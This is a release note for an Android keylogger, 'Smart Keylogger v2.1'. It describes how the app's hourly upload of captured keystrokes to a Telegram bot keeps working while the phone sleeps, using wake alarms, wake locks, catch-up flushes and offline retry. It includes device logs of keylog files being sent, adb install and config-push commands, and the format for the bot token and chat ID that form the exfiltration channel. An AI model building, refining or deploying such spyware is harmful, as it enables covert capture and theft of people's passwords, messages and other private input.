## ⌨️ Smart Keylogger v2.1 — Doze-Proof Scheduling

> The hourly upload now fires with the screen off and the phone asleep.

### 🐛 The Bug
The hourly `Handler.postDelayed` chain **never fired**. The process stayed
healthy for 16 hours (same PID, `isFrozen=false`, standby bucket `ACTIVE`,
doze `ACTIVE`, charging) yet four consecutive 1-hour fires were missed —
while a 60-second test build worked fine. The main looper simply stopped
being scheduled. That is the normal state of a phone in a pocket, so the
timer design was wrong, not the code around it.

### ✅ The Fix
- **`AlarmManager` `RTC_WAKEUP`** replaces the `Handler` chain.
  `setAndAllowWhileIdle` is used deliberately: exact alarms need
  `SCHEDULE_EXACT_ALARM` on API 31+, and an hourly log upload does not need
  millisecond precision. Observed jitter is ~45 s.
- **`UploadReceiver`** re-arms the next alarm *before* doing any work, so the
  chain survives a crash or a timeout in the upload itself.
- **`PARTIAL_WAKE_LOCK`** (5 min cap) keeps the CPU alive until the upload
  finishes, then releases.
- **Self-healing catch-up**: if a cycle is overdue, the next captured
  interaction flushes it. Covers OEMs that throttle alarms.
- **Offline retry**: files stay in `outbox/` and replay automatically once the
  network returns — proven below.

### 🔧 Refactor
- `UploadPipeline` — one synchronized rotate/upload/prune path shared by the
  service and the receiver (no duplicated file logic, no races).
- `TelegramConfig` — credential resolution; build-time values win over
  `telegram.conf`.
- Every source file is now under 400 lines.

### 📱 Device Proof (Redmi Note 4, screen **off**)

```
11-09 16:24:44.407 D Keylogger: alarm received: ...action.UPLOAD
11-09 16:24:44.410 D Keylogger: alarm armed in 60000ms
11-09 16:24:46.563 D Keylogger: sendDocument ok http=200 file=keylog_20261109_162444.txt bytes=525
11-09 16:24:46.565 D Keylogger: uploaded keylog_20261109_162444.txt
```

`mWakefulness=Dozing` at the time. `pending.txt` gone, outbox `total 0`.

Offline→online retry, production 1-hour build:

```
11-10 12:56:24.640 E Keylogger: sendDocument failed      (no network)
11-10 12:56:24.641 E Keylogger: upload failed, will retry next cycle: keylog_20261110_125624.txt
11-10 13:16:48.360 D Keylogger: sendDocument ok http=200 file=keylog_20261110_125624.txt bytes=89
```

Full verifier: `RETEST_EXIT=0`, 8/8 assertions green.

### 📥 Install

```bash
adb install -r smart-keylogger-2.1.apk
```

This APK is credential-free. Provide credentials either by building with
`local.properties`, or by pushing a `telegram.conf`:

```bash
adb push telegram.conf /sdcard/Android/data/com.bshu2.androidkeylogger/files/
```

```ini
bot_token=123456:AA...
chat_id=987654321
```

**Full Changelog**: https://github.com/Praveensenpai/Smart-Keylogger/compare/v2.0...v2.1